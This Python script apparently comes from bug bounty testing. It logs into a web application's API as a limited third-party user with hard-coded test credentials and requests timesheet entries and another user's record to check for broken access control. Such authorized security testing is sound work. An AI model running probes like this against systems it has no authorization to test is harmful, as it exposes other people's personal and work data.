import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
def login(email,pw):
    cmd=['curl','-s','-m','25','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
# role 11 limited third-party user
c,b=login("zx-6db21a8623@bugcrowdninja.com","Tester")
print("TPU login:",c)
if c=='200':
    tok=json.loads(b)['session']['token']
    open('/tmp/bac_TPU','w').write(tok)
    s=json.loads(b)['session']
    print(f"  id={s['id']} role={s['role_id']}")
    def get(p):
        cmd=['curl','-s','-m','25','-o','/tmp/b','-w','%{http_code}',H+p,'-H','token: '+tok,'-H',BB]
        cc=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
        return cc, open('/tmp/b',encoding='utf-8',errors='replace').read()
    print()
    print("=== role 11 (limited) vs timesheet entries ===")
    for p in ['/api/v1/timesheet_entries','/api/v1/timesheet_entries/43','/api/v1/users/1']:
        cc,bb=get(p)
        n=0; users=set()
        try:
            ts=json.loads(bb)['timesheet_entries']; n=len(ts); users={t.get('user_id') for t in ts}
        except: pass
        print(f"  {cc} {p:40} entries={n} users={sorted(users)[:6]}")
else:
    print("  ",b[:150])
